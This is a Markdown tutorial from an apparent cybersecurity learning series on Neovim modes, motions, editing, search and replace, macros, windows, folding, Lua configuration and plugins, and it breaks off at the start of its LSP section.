# Neovim — Tips & Tricks

> LearnCybersecurity | Editor Mastery Series
> Last Updated: 2026 | Author: kodoktheGr3at

---

<!-- LC-CURRICULUM-START -->
> **Curriculum ID:** `LC-071` | **Phase 8:** Bonus
> **Est. study:** 8-10h | **Level:** Intermediate
> **Prerequisites:** LC-016
> **Book map:** Shotts, The Linux Command Line Ch.11-12, 24
<!-- LC-CURRICULUM-END -->

## Table of Contents

| # | Topic | Description |
|---|-------|-------------|
| 1 | Overview | What is Neovim & why it matters |
| 2 | Modes | Neovim modes |
| 3 | Movement | Cursor navigation & movement |
| 4 | Editing | Text editing tricks |
| 5 | Search & Replace | Search & replace |
| 6 | Registers & Macros | Registers & macros |
| 7 | Buffers, Windows, Tabs | Buffers, windows, and tabs |
| 8 | Visual Mode | Advanced visual mode |
| 9 | Folding & Marks | Folding & marks |
| 10 | Config & Lua | Configuration with Lua |
| 11 | Plugins | Essential plugins |
| 12 | LSP & Autocomplete | LSP & autocompletion |
| 13 | Terminal & Shell | Integrated terminal |
| 14 | Security Note | Neovim for pentest & CTF |
| 15 | Workflow | Practical workflow examples |

---

## Key Terms

You'll see these words throughout the lesson.

| Term | Plain meaning |
|:---|:---|
| Neovim (nvim) | A modern, extensible rewrite of the Vim editor |
| Mode | Neovim is modal: normal (commands), insert (typing), visual (selecting) |
| Buffer | An open file held in memory |
| Window / split | A viewport onto a buffer; the screen can be split into several |
| Motion | A command that moves the cursor (`w`, `}`, `gg`) |
| Plugin | An add-on that extends the editor |
| `init.lua` | Neovim's config file, written in Lua |
| LSP | Language Server Protocol: gives code completion and diagnostics |

---

## 1. Overview — What Is Neovim

**Neovim (nvim)** is a modern fork of Vim built for extensibility, performance, and ease of plugin development. Neovim preserves Vim's modal editing philosophy while adding native support for Lua scripting, LSP (Language Server Protocol), Treesitter, and an integrated terminal.

Unlike mouse-driven editors like VSCode, Neovim is designed so your hands never need to leave the keyboard; all navigation, editing, and command execution happen through efficient key combinations.

**Why it matters for cybersecurity:**
- Available almost everywhere (servers, minimal containers, SSH sessions), often the only editor present
- No GUI required, which is ideal for working over a remote shell during pentests or forensics
- Fast editing of payloads, configs, and exploit scripts without leaving the terminal
- Regex and macro power to mass-process logs or tool output
- LSP plugins to navigate and read large codebases during code audits

---

## 2. Modes — The Modal Editing System

Neovim uses modal editing, the key to its efficiency. Each mode has a specific purpose, and the same key can do different things depending on which mode is active.

```vim
" ── MODE OVERVIEW ────────────────────────────────────────────────
" NORMAL mode   → default mode, navigation & commands (ESC to return here)
" INSERT mode   → typing text directly (i, a, o, etc. to enter)
" VISUAL mode   → selecting text (v, V, Ctrl+v)
" COMMAND mode  → ex-commands (: to enter)
" REPLACE mode  → overwrite text (R to enter)
" TERMINAL mode → interacting with embedded terminal (i to enter, from terminal buffer)

" ── ENTERING INSERT MODE ──────────────────────────────────────────
i        " insert before cursor
I        " insert at beginning of line
a        " insert (append) after cursor
A        " insert (append) at end of line
o        " open new line BELOW and insert
O        " open new line ABOVE and insert
s        " delete char under cursor, then insert
S        " delete entire line, then insert (same as cc)
cc       " change entire line (delete + insert)
ciw      " change inner word (delete word under cursor + insert)

" ── ENTERING VISUAL MODE ──────────────────────────────────────────
v        " character-wise visual
V        " line-wise visual
Ctrl+v   " block-wise visual (column selection)
gv       " reselect last visual selection

" ── RETURN TO NORMAL MODE ─────────────────────────────────────────
Esc      " always works
Ctrl+[   " alternative to Esc (doesn't require reaching for Esc key)
jk       " common custom remap (see config section)
```

| Mode | Key to Enter | Function |
|------|--------------|----------|
| Normal | `Esc` | Navigation & commands |
| Insert | `i` `a` `o` | Typing text |
| Visual | `v` `V` `Ctrl+v` | Selecting text |
| Command | `:` | Ex commands |
| Replace | `R` | Overwrite text |
| Terminal | `:terminal` then `i` | Embedded terminal |

---

## 3. Movement — Cursor Navigation

Efficient navigation is the core of Vim/Neovim productivity. The goal: reach any position in the buffer without repeatedly pressing arrow keys.

```vim
" ── BASIC MOVEMENT (avoid arrow keys!) ───────────────────────────
h j k l      " left, down, up, right
0            " go to first column of line (column 0, before indent)
^            " go to first NON-BLANK character of line
$            " go to end of line
g_           " go to last non-blank character of line

" ── WORD MOVEMENT ─────────────────────────────────────────────────
w            " jump forward to start of next word
W            " jump forward to next WORD (whitespace-separated, ignores punctuation)
b            " jump backward to start of word
B            " jump backward to start of WORD
e            " jump forward to end of word
E            " jump forward to end of WORD
ge           " jump backward to end of previous word

" ── LINE MOVEMENT ─────────────────────────────────────────────────
gg           " go to first line of file
G            " go to last line of file
:42          " go to line 42
42G          " go to line 42 (alternative)
42gg         " go to line 42 (alternative)
{            " jump to previous blank line / paragraph
}            " jump to next blank line / paragraph

" ── SCREEN MOVEMENT ───────────────────────────────────────────────
H            " move to top of screen (High)
M            " move to middle of screen (Middle)
L            " move to bottom of screen (Low)
zz           " center current line on screen
zt           " scroll so current line is at TOP of screen
zb           " scroll so current line is at BOTTOM of screen
Ctrl+d       " scroll down half a page
Ctrl+u       " scroll up half a page
Ctrl+f       " scroll forward full page
Ctrl+b       " scroll backward full page

" ── CHARACTER SEARCH (within a line) ──────────────────────────────
f<char>      " jump forward TO next occurrence of <char>
F<char>      " jump backward TO previous occurrence of <char>
t<char>      " jump forward UNTIL (just before) next <char>
T<char>      " jump backward UNTIL (just after) previous <char>
;            " repeat last f/F/t/T search
,            " repeat last f/F/t/T search in OPPOSITE direction

" ── MATCHING / BRACKETS ───────────────────────────────────────────
%            " jump to matching bracket: ( ) [ ] { }
[{           " jump to unmatched opening brace
]}           " jump to unmatched closing brace

" ── JUMPS & MARKS (history navigation) ────────────────────────────
Ctrl+o       " go back to previous (older) cursor position
Ctrl+i       " go forward to next (newer) cursor position
`.           " jump to position of last edit
gi           " jump to last insert position AND enter insert mode

" ── SEARCH MOVEMENT ───────────────────────────────────────────────
/pattern     " search forward
?pattern     " search backward
n            " repeat search in same direction
N            " repeat search in OPPOSITE direction
*            " search forward for word under cursor (whole word)
#            " search backward for word under cursor (whole word)
```

| Movement | Function |
|----------|----------|
| `w` / `b` | Jump word forward/back |
| `0` / `$` | Start/end of line |
| `gg` / `G` | Start/end of file |
| `f<char>` | Jump to character |
| `%` | Jump to matching bracket |
| `Ctrl+o`/`Ctrl+i` | Navigate cursor jump history |
| `*` / `#` | Search word under cursor |

---

## 4. Editing — Text Manipulation Tricks

Editing in Neovim is built on the "verb + noun" concept: combining an operator (what to do) with a motion or text object (where to do it). Understanding this pattern unlocks the true power of modal editing.

```vim
" ── OPERATOR + MOTION PATTERN ─────────────────────────────────────
" Format: [count] operator [count] motion
d        " delete operator
c        " change operator (delete + enter insert mode)
y        " yank (copy) operator
>        " indent operator
<        " unindent operator
=        " auto-indent operator
gu       " lowercase operator
gU       " uppercase operator

" ── COMMON COMBINATIONS ───────────────────────────────────────────
dw       " delete word
diw      " delete inner word (text object — smarter than dw)
daw      " delete a word (includes surrounding whitespace)
dd       " delete entire line
d$       " delete to end of line
d0       " delete to beginning of line
dG       " delete to end of file
dgg      " delete to beginning of file
2dd      " delete 2 lines
d3w      " delete 3 words

cw       " change word
ciw      " change inner word
cc       " change entire line
ci"      " change inside double quotes
ci(      " change inside parentheses
ct,      " change until comma

yy       " yank (copy) current line
3yy      " yank 3 lines
yiw      " yank inner word
y$       " yank to end of line

" ── TEXT OBJECTS (i = inner, a = around) ──────────────────────────
iw / aw  " inner word / a word (with surrounding space)
is / as  " inner sentence / a sentence
ip / ap  " inner paragraph / a paragraph
i" / a"  " inside quotes / around quotes (includes quotes)
i' / a'  " inside single quotes / around single quotes
i( / a(  " inside parens / around parens (also ib/ab)
i{ / a{  " inside braces / around braces (also iB/aB)
i[ / a[  " inside brackets / around brackets
it / at  " inside HTML/XML tag / around tag

" Examples:
ci(      " change everything inside ( )
da"      " delete a quoted string INCLUDING quotes
yi{      " yank everything inside { }

" ── PASTE / PUT ────────────────────────────────────────────────────
p        " paste after cursor / below line
P        " paste before cursor / above line
gp       " paste after, cursor moves to AFTER pasted text
"0p      " paste from yank register (not affected by deletes)

" ── UNDO / REDO ────────────────────────────────────────────────────
u        " undo
Ctrl+r   " redo
U        " undo all changes on current line (fix line mistake)
g-       " go to older text state (undo tree)
g+       " go to newer text state (undo tree)

" ── JOIN LINES ─────────────────────────────────────────────────────
J        " join current line with next (adds a space)
gJ       " join lines WITHOUT adding a space

" ── REPEAT LAST CHANGE ─────────────────────────────────────────────
.        " repeat last change — THE single most powerful key in Vim
" Example workflow: ciw<word>Esc then move and press . to repeat

" ── INDENTATION ───────────────────────────────────────────────────
>>       " indent current line
<<       " unindent current line
=        " auto-indent (use with motion, e.g. =G to indent to end of file)
gg=G     " auto-indent ENTIRE file

" ── CASE TOGGLING ─────────────────────────────────────────────────
~        " toggle case of character under cursor
guu      " lowercase entire line
gUU      " uppercase entire line
g~~      " toggle case of entire line
guiw     " lowercase inner word

" ── REPLACE SINGLE CHARACTER ───────────────────────────────────────
r<char>  " replace single character under cursor (no insert mode needed)
3rx      " replace 3 characters with 'x'

" ── DELETE WITHOUT YANKING (preserve register) ────────────────────
"_dd     " delete line WITHOUT overwriting the yank register
```

| Pattern | Example |
|---------|---------|
| `d` + motion | `dw`, `d$`, `dd` |
| `c` + text object | `ciw`, `ci"`, `ci(` |
| `y` + motion | `yy`, `yiw`, `y$` |
| `.` | Repeat last change |
| `u` / `Ctrl+r` | Undo / Redo |

---

## 5. Search & Replace

Neovim has an extremely powerful regex-based search and replace engine (its pattern mode is called "Vim regex"), useful for quick refactors or cleaning up large log or data files.

```vim
" ── BASIC SEARCH ──────────────────────────────────────────────────
/pattern              " search forward
?pattern              " search backward
n / N                 " next / previous match
:set hlsearch         " highlight all matches
:set incsearch        " show matches while typing
:nohlsearch           " clear highlight (often mapped to <leader>/ or similar)
:set ignorecase smartcase   " case-insensitive unless uppercase used

" ── SUBSTITUTE COMMAND (:s) ───────────────────────────────────────
:s/old/new/           " replace FIRST occurrence on current line
:s/old/new/g          " replace ALL occurrences on current line
:%s/old/new/g         " replace ALL occurrences in ENTIRE file
:%s/old/new/gc        " replace all, with CONFIRMATION for each
:1,10s/old/new/g      " replace within lines 1 to 10
:.,+5s/old/new/g      " replace from current line to 5 lines below
:'<,'>s/old/new/g     " replace within visual selection (auto-filled after V)

" ── CASE-SENSITIVITY FLAGS ────────────────────────────────────────
:%s/old/new/gi        " case-insensitive replace
:%s/Old/New/gI        " case-SENSITIVE replace (force, ignore smartcase)

" ── REGEX PATTERNS (Vim-flavored) ─────────────────────────────────
:%s/\d\+/NUM/g                " replace all numbers (one or more digits)
:%s/^\s*//g                    " remove leading whitespace
:%s/\s*$//g                    " remove trailing whitespace
:%s/\n\n\+/\r\r/g              " collapse multiple blank lines to one
:%s/foo\|bar/baz/g             " replace "foo" OR "bar" with "baz"
:%s/\<word\>/replacement/g     " whole word match only (\< \> = word boundaries)
:%s/\(.*\):\(.*\)/\2:\1/       " swap text around a colon using capture groups

" ── USING & FOR THE MATCHED TEXT ──────────────────────────────────
:%s/error/[&]/g                " wrap matched word "error" in brackets → [error]

" ── CAPTURE GROUPS ─────────────────────────────────────────────────
:%s/\(\w\+\)@\(\w\+\)/\2@\1/g  " swap parts before/after @ symbol

" ── REPLACE ACROSS MULTIPLE FILES (arglist / quickfix) ────────────
:args **/*.js                  " load all .js files into arg list
:argdo %s/old/new/g | update   " apply substitution to ALL files + save

" Using quickfix list with grep:
:vimgrep /pattern/ **/*.py     " populate quickfix list
:cdo %s/old/new/g | update     " apply to all quickfix entries

" ── SEARCH WITHIN VISUAL SELECTION ────────────────────────────────
" 1. Select text with V (visual line mode)
" 2. Type : — it auto-fills as :'<,'>
" 3. Append s/old/new/g

" ── COMMON USEFUL PATTERNS ────────────────────────────────────────
:%s/\r//g                      " remove carriage returns (CRLF → LF)
:%s/\t/    /g                  " replace tabs with 4 spaces
:%s/[[:space:]]\+$//e          " remove trailing whitespace (POSIX class)
:g/^$/d                        " delete ALL empty lines
:g/pattern/d                   " delete all lines matching pattern
:v/pattern/d                   " delete all lines NOT matching pattern (inverse)
:g/pattern/normal A;           " append ; to end of every matching line
```

| Command | Function |
|---------|----------|
| `:%s/old/new/g` | Replace all in file |
| `:%s/old/new/gc` | Replace with confirmation |
| `:'<,'>s/old/new/g` | Replace in visual selection |
| `:g/pattern/d` | Delete matching lines |
| `:g/^$/d` | Delete empty lines |
| `\<word\>` | Whole word match |

---

## 6. Registers & Macros

Registers are Neovim's "clipboards", except there can be many of them, letting you store multiple pieces of text simultaneously. Macros record a sequence of commands to replay, which is extremely powerful for repetitive tasks like cleaning hundreds of log lines.

```vim
" ── REGISTERS BASICS ──────────────────────────────────────────────
"ayy           " yank current line into register 'a'
"ap            " paste from register 'a'
"add           " delete line into register 'a'
:reg           " view contents of all registers
:reg a b c     " view contents of specific registers

" ── SPECIAL REGISTERS ─────────────────────────────────────────────
"" (unnamed)   " default register — last yank/delete goes here automatically
"0             " yank register — ONLY updated by yank (not delete), survives deletes
"1-"9          " numbered registers — history of deletes (most recent = "1)
"_             " black hole register — delete without affecting any register
"+             " system clipboard (cross-application copy/paste)
"*             " selection clipboard (X11 primary selection, Linux)
"%             " current filename
".             " last inserted text
":             " last command-line command
"/             " last search pattern

" ── SYSTEM CLIPBOARD INTEGRATION ──────────────────────────────────
"+yy            " yank line to SYSTEM clipboard (use in other apps)
"+p             " paste FROM system clipboard
:set clipboard=unnamedplus    " make ALL yanks/deletes go to system clipboard automatically

" ── APPENDING TO A REGISTER ───────────────────────────────────────
"Ayy            " APPEND current line to register 'a' (uppercase = append)

" ── MACROS — RECORD & REPLAY ──────────────────────────────────────
qa              " start recording macro into register 'a'
" ... perform your edits ...
q               " stop recording
@a              " replay macro 'a' once
@@              " replay the LAST executed macro again
5@a             " replay macro 'a' 5 times
:%normal @a     " apply macro 'a' to EVERY line in the file

" ── PRACTICAL MACRO EXAMPLE ───────────────────────────────────────
" Goal: convert "name,age" CSV lines to "Name: name, Age: age"
" 1. Position cursor on first line
" 2. qa                     (start recording into 'a')
" 3. ^iName: <Esc>f,iAge: <Esc>j0   (edit the line, move to next)
" 4. q                      (stop recording)
" 5. 100@a                  (apply to next 100 lines)

" ── EDITING A MACRO AFTER RECORDING ───────────────────────────────
:let @a='^iName: a Age: j0'   " manually inspect/edit macro 'a' content
" Macros are stored as plain text in registers — can paste/edit them like text!
"ap                            " paste macro content as text to edit it
" then re-yank the edited line back: "ayy

" ── COMBINING MACRO + COUNT FOR BULK OPERATIONS ───────────────────
qaqa            " trick: clear register 'a' before re-recording (empty macro first)
```

| Register | Contents |
|----------|----------|
| `""` | Last yank/delete |
| `"0` | Last yank only |
| `"+` | System clipboard |
| `"_` | Black hole (discard) |
| `qa...q` | Record macro to 'a' |
| `@a` | Replay macro 'a' |
| `:%normal @a` | Apply to all lines |

---

## 7. Buffers, Windows, Tabs

Neovim has three distinct concepts for managing multiple files: Buffer (a file loaded into memory), Window (a viewport into a buffer), and Tab (a collection of windows/layout). Understanding the difference is important since it differs from other editors.

```vim
" ── BUFFERS ────────────────────────────────────────────────────────
:e file.txt          " edit (open) a file in a new buffer
:ls / :buffers       " list all open buffers
:b 2                 " switch to buffer number 2
:b filename          " switch to buffer matching name (partial match works)
:bn / :bnext         " go to next buffer
:bp / :bprev         " go to previous buffer
:bd / :bdelete       " delete (close) current buffer
:bd!                 " force delete buffer (discard unsaved changes)
Ctrl+^ (Ctrl+6)      " toggle between current and last buffer (very fast!)

" ── WINDOWS (SPLITS) ───────────────────────────────────────────────
:sp / :split         " horizontal split (open file above/below)
:vsp / :vsplit       " vertical split (open file side by side)
:sp file.txt         " horizontal split with a specific file
:vsp file.txt        " vertical split with a specific file

Ctrl+w s             " horizontal split (mnemonic: window-split)
Ctrl+w v             " vertical split

" ── WINDOW NAVIGATION ─────────────────────────────────────────────
Ctrl+w h/j/k/l       " move to window left/down/up/right
Ctrl+w w             " cycle to next window
Ctrl+w p             " go to previously active window
Ctrl+w q             " close current window
Ctrl+w o             " close ALL other windows (keep only current — "only")

" ── WINDOW RESIZING ───────────────────────────────────────────────
Ctrl+w =             " equalize all window sizes
Ctrl+w +             " increase height
Ctrl+w -             " decrease height
Ctrl+w >             " increase width
Ctrl+w <             " decrease width
Ctrl+w _             " maximize height of current window
Ctrl+w |             " maximize width of current window
:resize 20           " set height to 20 lines
:vertical resize 80  " set width to 80 columns

" ── WINDOW REARRANGING ────────────────────────────────────────────
Ctrl+w r             " rotate windows
Ctrl+w x             " exchange current window with next
Ctrl+w H/J/K/L       " move current window to far left/bottom/top/right

" ── TABS ───────────────────────────────────────────────────────────
:tabnew              " open a new empty tab
:tabnew file.txt     " open file in a new tab
:tabe file.txt        " same as tabnew (alias)
gt                    " go to next tab
gT                    " go to previous tab
2gt                   " go to tab number 2
:tabclose             " close current tab
:tabonly               " close all OTHER tabs
:tabs                  " list all open tabs
:tabmove 0             " move current tab to first position

" ── PRACTICAL TIPS ────────────────────────────────────────────────
" Buffers = files in memory (think: open documents)
" Windows = viewports (think: panes showing a buffer)
" Tabs    = layouts of windows (think: workspaces)
" Same buffer can be shown in MULTIPLE windows simultaneously!
```

| Concept | Analogy |
|---------|---------|
| Buffer | File loaded in memory |
| Window | Pane displaying a buffer |
| Tab | Collection of window layouts |
| `Ctrl+w h/j/k/l` | Move between windows |
| `gt` / `gT` | Move between tabs |

---

## 8. Visual Mode — Advanced Selection

Visual mode in Neovim is far more powerful than simple "select and copy". Visual Block mode in particular is invaluable for editing columns of data, mass indentation, and manipulating structured text like CSV output or logs.

```vim
" ── VISUAL MODE TYPES ──────────────────────────────────────────────
v             " character-wise visual
V             " line-wise visual
Ctrl+v        " block-wise visual (column selection!)

" ── VISUAL BLOCK — column editing ──────────────────────────────────
" 1. Ctrl+v to start block selection
" 2. Move down/up with j/k to select a column of lines
" 3a. I<text><Esc>     → insert text at start of EVERY selected line
" 3b. A<text><Esc>     → append text at end of EVERY selected line
" 3c. c<text><Esc>     → change (replace) the selected block on every line
" 3d. d                → delete the selected block from every line
" 3e. r<char>           → replace every selected char with <char>

" Example: comment out 10 lines with "# "
" Ctrl+v, select 10 lines down (9j), then:
I# <Esc>

" Example: add semicolons to end of multiple lines
" Ctrl+v, jjjj (select 5 lines), then $ to extend to end of each line:
$A;<Esc>

" ── VISUAL MODE OPERATIONS ────────────────────────────────────────
" While in visual mode (after selecting):
d             " delete selection
y             " yank (copy) selection
c             " change selection (delete + insert)
>             " indent selection
<             " unindent selection
=             " auto-indent selection
gu / gU       " lowercase / uppercase selection
J             " join selected lines
u             " lowercase selection (alt)
U             " uppercase selection (alt)
~             " toggle case of selection

" ── SORT / FILTER SELECTED TEXT ───────────────────────────────────
:'<,'>sort              " sort selected lines alphabetically
:'<,'>sort!              " sort in reverse
:'<,'>sort u              " sort and remove duplicates
:'<,'>sort n              " numeric sort
:'<,'>!sort -n            " pipe selection through external sort -n
:'<,'>!awk '{print $1}'   " pipe selection through awk

" ── REPEAT VISUAL SELECTION ───────────────────────────────────────
gv            " reselect last visual selection (great after accidental Esc)

" ── EXPAND/SHRINK SELECTION ───────────────────────────────────────
" In visual mode, motions extend the selection:
viw           " select inner word
vi(           " select inside parentheses
vip           " select inner paragraph
o             " (in visual mode) swap which end of selection cursor is on

" ── BLOCK INSERT WITH NUMBERED LINES (combine with macros) ────────
" Insert line numbers: use Ctrl+v then g Ctrl+a for incrementing
" Select a column of identical numbers, then:
g Ctrl+a       " increment each line by an INCREASING amount (1,2,3...)
Ctrl+a         " increment number under cursor
Ctrl+x         " decrement number under cursor
```

| Trick | Function |
|-------|----------|
| `Ctrl+v` | Visual block (columns) |
| `I<text><Esc>` | Insert at start of each line |
| `:'<,'>sort` | Sort selected lines |
| `gv` | Reselect last selection |
| `g Ctrl+a` | Sequential increment |

---

## 9. Folding & Marks

Folding hides sections of code/text to focus on relevant parts. Marks are cursor position bookmarks for quickly jumping between locations within a file or across files.

```vim
" ── FOLDING ────────────────────────────────────────────────────────
zf<motion>    " create a fold (e.g., zfap = fold a paragraph, zf5j = fold 5 lines)
za            " toggle fold under cursor (open/close)
zo            " open fold under cursor
zc            " close fold under cursor
zO            " open ALL folds under cursor (nested)
zC            " close ALL folds under cursor (nested)
zR            " open ALL folds in the file
zM            " close ALL folds in the file
zd            " delete fold under cursor
zE            " eliminate (delete) all folds in file
zj            " move to next fold
zk            " move to previous fold

" ── FOLD METHODS (set in config) ──────────────────────────────────
:set foldmethod=manual     " folds created manually with zf
:set foldmethod=indent     " fold based on indentation level
:set foldmethod=syntax     " fold based on language syntax
:set foldmethod=expr       " fold based on custom expression (used by Treesitter)
:set foldmethod=marker     " fold based on {{{ }}} markers in text

" ── MARKS ──────────────────────────────────────────────────────────
ma            " set mark 'a' at current cursor position
`a            " jump to EXACT position of mark 'a' (backtick = precise)
'a            " jump to LINE of mark 'a' (single quote = line-wise, col 0)
:marks        " list all marks
:delmarks a   " delete mark 'a'
:delmarks!    " delete all lowercase marks

" ── SPECIAL/AUTOMATIC MARKS ───────────────────────────────────────
`.            " jump to position of last change
`^            " jump to position of last insert
`<            " jump to start of last visual selection
`>            " jump to end of last visual selection
``            " jump to position before last jump (toggle back)
'[            " jump to start of last yanked/changed text
']            " jump to end of last yanked/changed text

" ── UPPERCASE MARKS — work ACROSS FILES ───────────────────────────
mA            " set GLOBAL mark 'A' (uppercase = file-specific, persists across sessions)
`A            " jump to mark 'A' — even if it's in a DIFFERENT file (opens it!)
" Great for marking "home base" files like main.py, config files, etc.

" ── PRACTICAL FOLDING WORKFLOW ────────────────────────────────────
zfip          " fold inner paragraph
zfa{          " fold a { } block (e.g., a function body)
" combined with foldmethod=syntax, language-aware folds appear automatically
```

| Command | Function |
|---------|----------|
| `za` | Toggle fold |
| `zR` / `zM` | Open/close all folds |
| `ma` / `` `a `` | Set/jump local mark |
| `mA` / `` `A `` | Global mark (cross-file) |
| `` `` `` `` | Toggle previous position |

---

## 10. Config & Lua — Configuration

Modern Neovim uses Lua as its primary configuration language (replacing legacy VimScript), stored in `~/.config/nvim/init.lua`. Lua is faster, more readable, and has a much richer plugin ecosystem.

```lua
-- ~/.config/nvim/init.lua

-- ── BASIC OPTIONS ──────────────────────────────────────────────────
vim.opt.number = true              -- show line numbers
vim.opt.relativenumber = true      -- relative line numbers (great for motions like 5j)
vim.opt.tabstop = 4                -- width of a tab character
vim.opt.shiftwidth = 4             -- width of indentation
vim.opt.expandtab = true           -- convert tabs to spaces
vim.opt.smartindent = true         -- smart auto-indenting
vim.opt.wrap = false               -- disable line wrapping
vim.opt.ignorecase = true          -- case-insensitive search...
vim.opt.smartcase = true           -- ...unless uppercase is used
vim.opt.hlsearch = true            -- highlight search matches
vim.opt.incsearch = true           -- show matches while typing
vim.opt.cursorline = true          -- highlight current line
vim.opt.scrolloff = 8              -- keep 8 lines visible above/below cursor
vim.opt.signcolumn = "yes"         -- always show sign column (avoids text shift)
vim.opt.termguicolors = true       -- enable 24-bit RGB colors
vim.opt.clipboard = "unnamedplus"  -- use system clipboard by default
vim.opt.splitright = true          -- vertical splits open to the right
vim.opt.splitbelow = true          -- horizontal splits open below
vim.opt.undofile = true            -- persistent undo across sessions
vim.opt.swapfile = false           -- disable swap files

-- ── LEADER KEY (must be set BEFORE plugins load) ───────────────────
vim.g.mapleader = " "              -- spacebar as leader key (very common choice)
vim.g.maplocalleader = " "

-- ── KEYMAPS ────────────────────────────────────────────────────────
local map = vim.keymap.set

map("i", "jk", "<Esc>", { desc = "Exit insert mode with jk" })
map("n", "<leader>w", ":w<CR>", { desc = "Save file" })
map("n", "<leader>q", ":q<CR>", { desc = "Quit" })
map("n", "<leader>nh", ":nohl<CR>", { desc = "Clear search highlight" })

-- Window navigation
map("n", "<C-h>", "<C-w>h", { desc = "Move to left window" })
map("n", "<C-j>", "<C-w>j", { desc = "Move to lower window" })
map("n", "<C-k>", "<C-w>k", { desc = "Move to upper window" })
map("n", "<C-l>", "<C-w>l", { desc = "Move to right window" })

-- Move selected lines up/down in visual mode
map("v", "J", ":m '>+1<CR>gv=gv", { desc = "Move selection down" })
map("v", "K", ":m '<-2<CR>gv=gv", { desc = "Move selection up" })

-- Keep cursor centered when jumping
map("n", "<C-d>", "<C-d>zz")
map("n", "<C-u>", "<C-u>zz")
map("n", "n", "nzzzv")
map("n", "N", "Nzzzv")

-- Paste without losing yanked text in visual mode
map("v", "p", '"_dP', { desc = "Paste without overwriting register" })

-- Buffer navigation
map("n", "<S-l>", ":bnext<CR>", { desc = "Next buffer" })
map("n", "<S-h>", ":bprevious<CR>", { desc = "Previous buffer" })

-- ── AUTOCOMMANDS ───────────────────────────────────────────────────
vim.api.nvim_create_autocmd("TextYankPost", {
  desc = "Highlight yanked text briefly",
  callback = function()
    vim.highlight.on_yank({ timeout = 200 })
  end,
})

vim.api.nvim_create_autocmd("BufWritePre", {
  desc = "Trim trailing whitespace on save",
  pattern = "*",
  command = [[%s/\s\+$//e]],
})

-- ── PLUGIN MANAGER BOOTSTRAP (lazy.nvim — most popular in 2026) ────
local lazypath = vim.fn.stdpath("data") .. "/lazy/lazy.nvim"
if not vim.loop.fs_stat(lazypath) then
  vim.fn.system({
    "git", "clone", "--filter=blob:none",
    "https://github.com/folke/lazy.nvim.git",
    "--branch=stable", lazypath,
  })
end
vim.opt.rtp:prepend(lazypath)

require("lazy").setup({
  { "nvim-treesitter/nvim-treesitter", build = ":TSUpdate" },
  { "nvim-telescope/telescope.nvim", dependencies = { "nvim-lua/plenary.nvim" } },
  { "neovim/nvim-lspconfig" },
  { "hrsh7th/nvim-cmp" },
  { "nvim-tree/nvim-tree.lua" },
  { "lewis6991/gitsigns.nvim" },
})

-- ── CHECK HEALTH (run after config changes) ────────────────────────
-- :checkhealth          → diagnose Neovim setup issues
-- :checkhealth lazy      → check specific plugin health
```

| Setting | Function |
|---------|----------|
| `vim.g.mapleader` | Custom leader key |
| `vim.opt.relativenumber` | Relative line numbers |
| `vim.opt.undofile` | Persistent undo |
| `vim.keymap.set` | Create a custom keymap |
| `:checkhealth` | Diagnose configuration |

---

## 11. Plugins — Essential Extensions

The plugin ecosystem is one of Neovim's greatest strengths. Below are the most essential plugins that commonly form the foundation of modern setups (LazyVim, NvChad, and other custom configurations).

```lua
-- ── PLUGIN MANAGER ───────────────────────────────────────────────
-- lazy.nvim    — modern, fast plugin manager (most popular as of 2026)
-- packer.nvim  — older alternative, still used
:Lazy           " open the lazy.nvim plugin manager UI
:Lazy sync       " update all plugins
:Lazy clean      " remove unused plugins

-- ── FUZZY FINDER — telescope.nvim ───────────────────────────────────
-- The single most impactful productivity plugin
:Telescope find_files          " fuzzy find files in project
:Telescope live_grep            " fuzzy search text across all files (needs ripgrep)
:Telescope buffers               " fuzzy switch between open buffers
:Telescope help_tags             " fuzzy search Neovim help docs
:Telescope oldfiles              " fuzzy find recently opened files
:Telescope git_status            " browse git-modified files
:Telescope keymaps                " search all keymaps

-- Common keymaps:
-- <leader>ff  → find_files
-- <leader>fg  → live_grep
-- <leader>fb  → buffers

-- ── FILE EXPLORER — nvim-tree.lua / neo-tree.nvim ───────────────────
:NvimTreeToggle      " toggle file tree sidebar
:NvimTreeFocus        " focus the file tree
-- Inside the tree:
-- a → create file/folder | d → delete | r → rename | x → cut | p → paste

-- ── SYNTAX HIGHLIGHTING — nvim-treesitter ────────────────────────────
:TSInstall python javascript lua bash    " install parsers for languages
:TSUpdate                                 " update all installed parsers
:TSPlaygroundToggle                       " inspect syntax tree (debugging)
-- Provides accurate highlighting, indentation, and text objects (ic, af, etc.)

-- ── GIT INTEGRATION — gitsigns.nvim ──────────────────────────────────
-- Shows +/-/~ signs in the gutter for added/removed/modified lines
]c            " jump to next git hunk (change)
[c            " jump to previous git hunk
<leader>hs    " stage hunk
<leader>hr    " reset hunk
<leader>hp    " preview hunk diff
<leader>hb    " blame current line

-- ── STATUS LINE — lualine.nvim ───────────────────────────────────────
-- A fast, customizable status line showing mode, file, git branch, diagnostics

-- ── COMMENTING — Comment.nvim ─────────────────────────────────────────
gcc           " toggle comment on current line
gc<motion>    " toggle comment with motion (e.g., gcap = comment a paragraph)
gc            " (visual mode) toggle comment on selection

-- ── SURROUND — nvim-surround ──────────────────────────────────────────
ys<motion><char>   " add surround (e.g., ysiw" wraps word in quotes)
cs<old><new>        " change surround (e.g., cs"' changes " to ')
ds<char>             " delete surround (e.g., ds" removes surrounding quotes)
-- Example: cs"'   → changes "hello" to 'hello'

-- ── AUTO-PAIRS — nvim-autopairs ───────────────────────────────────────
-- Automatically closes brackets, quotes, parens as you type

-- ── WHICH-KEY — which-key.nvim ────────────────────────────────────────
-- Shows a popup of available keybindings after pressing leader key (huge for learning)

-- ── HARPOON — theprimeagen/harpoon ────────────────────────────────────
-- Quick-mark and jump between your MOST important files (faster than buffers)
:lua require("harpoon.mark").add_file()        " mark current file
:lua require("harpoon.ui").toggle_quick_menu()  " show harpoon menu
<leader>1 / <leader>2 / etc.                    " jump to harpooned file N
```

| Plugin | Function |
|--------|----------|
| `telescope.nvim` | Fuzzy finder for files/text |
| `nvim-tree.lua` | File explorer sidebar |
| `nvim-treesitter` | Accurate syntax highlighting |
| `gitsigns.nvim` | Git indicators in gutter |
| `Comment.nvim` | Quick comment toggling |
| `nvim-surround` | Manipulate brackets/quotes |
| `harpoon` | Fast file bookmarking |

---

## 12. LSP & Autocomplete

LSP (Language Server Protocol) gives Neovim IDE-level capabilities: go-to-definition, intelligent autocomplete, real-time error diagnostics, and refactoring, all without leaving the keyboard.

```lua
-- ── LSP SETUP (nvim-lspconfig) ───────────────────────────────────
-- Install language servers via Mason (package manager for LSP/DAP/linters)
:Mason                    " open Mason UI to browse/install servers
:MasonInstall pyright lua_ls tsserver gopls clangd bashls

-- Example server setup in init.lua:
